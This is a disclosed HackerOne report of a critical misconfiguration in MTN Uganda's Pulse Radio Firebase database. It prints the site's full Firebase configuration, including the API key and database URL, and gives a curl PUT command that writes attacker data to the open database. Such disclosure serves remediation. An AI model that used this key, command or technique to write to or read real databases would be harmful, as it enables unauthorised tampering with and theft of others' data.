# Firebase Database Takeover in https://pulseradio.mtn.co.ug/

## Report Details
- **Report ID**: 1447751
- **URL**: https://hackerone.com/reports/1447751
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-01-12T10:02:04.917Z
- **Disclosed**: 2022-12-01T10:52:59.962Z

## Reporter
- **Username**: shuvam321
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
During my test , in one of the subdomain of mtn.co.ug I found firebase configuration disclosed in the source code along with apiKey and database URL . 

Exploiting this vulnerability attacker is able to upload malicious data in the firebase account of pulseradio.mtn.co.ug and see database over there .

## Steps To Reproduce:

POC :  https://mtn-pulse-uganda.firebaseio.com/poc.json

1. Go to URL below and view the source code of website .

view-source:https://pulseradio.mtn.co.ug/wp-content/themes/mtn-pulse-reskin/zero-rate/firebase-config.js

There you will see following sensitive data .

$(document).ready(function() {
			// Your web app's Firebase configuration
			var firebaseConfig = {
				apiKey: "AIzaSyCRrABG3_Sc7xHar70hFyjHjEOJ071rbJ4",
				authDomain: "mtn-pulse-uganda.firebaseapp.com",
				databaseURL: "https://mtn-pulse-uganda.firebaseio.com",
				projectId: "mtn-pulse-uganda",
				storageBucket: "mtn-pulse-uganda.appspot.com",
				messagingSenderId: "242450689592",
				appId: "1:242450689592:web:bdd1173378d94d733800cd",
				measurementId: "G-KHPT64LJ5L"
			};


2. Now lets upload some data in firebase database  . Send the following curl request . Your data will be uploaded to firebase .


 curl "https://mtn-pulse-uganda.firebaseio.com/poc1.json" -XPUT -d '{"attacker":"maliciousdata"}'

3. Your data will be uploaded to https://mtn-pulse-uganda.firebaseio.com/poc1.json



References:
There are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:
https://firebase.google.com/docs/database/security/resolve-insecurities

## Impact

This is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if mtn uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the mtn.co.ug .

So please immediately change the rule of the database to private so that nobody can able to access it outside.

## Attachments
- Screenshot_from_2022-01-12_04-56-44.png
- vokoscreenNG-2022-01-12_04-55-42.mkv
